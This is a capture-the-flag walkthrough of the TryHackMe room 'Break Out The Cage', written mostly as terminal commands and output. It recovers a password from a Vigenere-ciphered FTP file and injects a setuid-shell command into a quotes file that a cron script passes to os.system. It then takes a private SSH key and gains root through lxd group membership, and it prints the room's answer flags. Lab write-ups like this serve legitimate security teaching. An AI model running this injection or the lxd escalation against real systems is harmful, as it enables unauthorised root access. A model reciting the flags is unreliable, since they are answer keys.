| Category          | Details                                                           |
|-------------------|-------------------------------------------------------------------|
| 📝 **Name**       | [Break Out The Cage](https://tryhackme.com/room/breakoutthecage1) |  
| 🏷 **Type**       | THM Challenge                                                     |
| 🖥 **OS**         | Linux                                                             |
| 🎯 **Difficulty** | Easy                                                              |
| 📁 **Tags**       | Vigenere cipher, command inject, lxd                              |

##  Task 1: Investigate!

### What is Weston's password?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-25 19:51 +0100
Nmap scan report for 10.81.153.230
Host is up (0.040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.130.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds
```

#### Enumerate FTP
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ ftp anonymous@$TARGET                                                                                                
Connected to 10.81.153.230.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||50010|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||7906|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |*******************************************************************************************************************************************************|   396        5.47 MiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (8.70 KiB/s)
```

#### Read exfiltrated file
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ cat dad_tasks       
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds 
```

#### Decode exfiltrated file
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ echo UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```
File seems to be ciphered. We were able to [identify](https://www.boxentriq.com/code-breaking/cipher-identifier) `Vigenere` cipher being used and were able to [decipher](https://www.dcode.fr/vigenere-cipher) to:

> Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!  
> One. Revamp the website  
> Two. Put more quotes in script  
> Three. Buy bee pesticide  
> Four. Help him with acting lessons  
> Five. Teach Dad what "information security" is.  
>  
> In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

It seems that Weston is using `Mydadisghostrideraintthatcoolnocausehesonfirejokes` as password.

### What's the user flag?

#### Access target over SSH using `weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ ssh weston@$TARGET
<SNIP>
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

#### Discover command injection vulnerability in `/opt/.dads_scripts/spread_the_quotes.py`
```
weston@national-treasure:~$ cat -n /opt/.dads_scripts/spread_the_quotes.py
     1  #!/usr/bin/env python
     2
     3  #Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
     4  import os
     5  import random
     6
     7  lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
     8  quote = random.choice(lines)
     9  os.system("wall " + quote)
    10
```
Vulnerability sits in line 9, as `quote` is being passed to `os.system()`. If we could write to `/opt/.dads_scripts/.files/.quotes` we could inject user shell spawner. We can also observe that this script is being run every 3 minutes.

#### Check write permission for `/opt/.dads_scripts/.files/.quotes`
```
weston@national-treasure:~$ ls -l /opt/.dads_scripts/.files/.quotes && lsattr /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 90 Jan 26 17:50 /opt/.dads_scripts/.files/.quotes
--------------e--- /opt/.dads_scripts/.files/.quotes
```
Since `weston` user belongs to `cage` group we could overwrite this file.

#### Overwrite `/opt/.dads_scripts/.files/.quotes` with user shell spawner
```
weston@national-treasure:~$ echo 'Spawing user shell...; /bin/cp /bin/bash /tmp/cage_shell && /bin/chmod +s /tmp/cage_shell' > /opt/.dads_scripts/.files/.quotes
```

#### Wait for shell spawner to be created
```
Broadcast message from cage@national-treasure (somewhere) (Mon Jan 26 17:51:01 
                                                                               
Spawing user shell...
weston@national-treasure:~$ ls -l /tmp/cage_shell
-rwsr-sr-x 1 cage cage 1113504 Jan 26 17:57 /tmp/cage_shell
```

#### Escalate to user `cage`
```
weston@national-treasure:~$ /tmp/cage_shell -p
cage_shell-4.4$ id
uid=1001(weston) gid=1001(weston) euid=1000(cage) egid=1000(cage) groups=1000(cage),1001(weston)
```

#### Capture user flag
```
cage_shell-4.4$ grep -oP THM{.+} /home/cage/Super_Duper_Checklist
THM{M37AL_0R_P3N_T35T1NG}
```

### What's the root flag?

#### Exfiltrate SSH private key of user `cage` 
```
cage_shell-4.4$ cat /home/cage/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
-----END RSA PRIVATE KEY-----
```

#### Copy exfiltrated SSH private key and use it to access target as user `cage`
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ chmod 600 cage_id_rsa && ssh -i cage_id_rsa cage@$TARGET 
<SNIP>
cage@national-treasure:~$ id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```
We can see that user `cage` belongs to the `lxd` group, which effectively makes him root. 

#### List instances managed by `lxd`
```
cage@national-treasure:~$ lxc list
+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
```

#### Copy and export `lxc` image locally
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ sudo lxc image copy images:alpine/3.22 local: --alias alpine-3.22 && sudo lxc image export alpine-3.22 ./alpine-3.22
Image copied successfully!                   
Image exported successfully!
```

#### Upload exported imaged
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ scp -i cage_id_rsa alpine-3.22 cage@$TARGET:~/ && scp -i cage_id_rsa alpine-3.22.root cage@$TARGET:~/
<SNIP> 
```

#### Import uploaded image
```
cage@national-treasure:~$ lxc image import ./alpine-3.22 ./alpine-3.22.root --alias alpine-3.22
Image imported with fingerprint: cc045f41dfcb9c4971d82e266dc745af8176ff2f9c4d3a476e23bcadf26847fe
```

#### Launch container
```
cage@national-treasure:~$ lxc storage create default dir && \
lxc profile device add default root disk path=/ pool=default && \
lxc launch alpine-3.22 pe-escalation-container
Storage pool default created
Device root added to default
Creating pe-escalation-container

The container you are starting doesn't have any network attached to it.
  To create a new network, use: lxc network create
  To attach a network to a container, use: lxc network attach

Starting pe-escalation-container
```
We had to also create default storage.

#### Upload `lxd_rootv1.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/THM Break Out The Cage]
└─$ scp -i cage_id_rsa ~/Tools/lxd_root/lxd_rootv1.sh cage@$TARGET:~/ 
```

#### Run `lxd_rootv1.sh` exploit
```
cage@national-treasure:~$ ./lxd_rootv1.sh pe-escalation-container
[+] Stopping container pe-escalation-container
[+] Setting container security privilege on
[+] Starting container pe-escalation-container
[+] Mounting host root filesystem to pe-escalation-container
Device rootdisk added to pe-escalation-container
[+] Using container to add cage to /etc/sudoers
[+] Unmounting host root filesystem from pe-escalation-container
Device rootdisk removed from pe-escalation-container
[+] Resetting container security privilege to off
[+] Stopping the container
[+] Done! Enjoy your sudo superpowers!
cage@national-treasure:~$ 
```

#### Confirm sudo `(ALL) NOPASSWD: ALL`
```
cage@national-treasure:~$ sudo -l
Matching Defaults entries for cage on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cage may run the following commands on national-treasure:
    (ALL) NOPASSWD: ALL
```

#### `su` to `root`
```
cage@national-treasure:~$ sudo su
root@national-treasure:/home/cage# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@national-treasure:/# grep -oP THM{.+} /root/email_backup/email_2 
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```
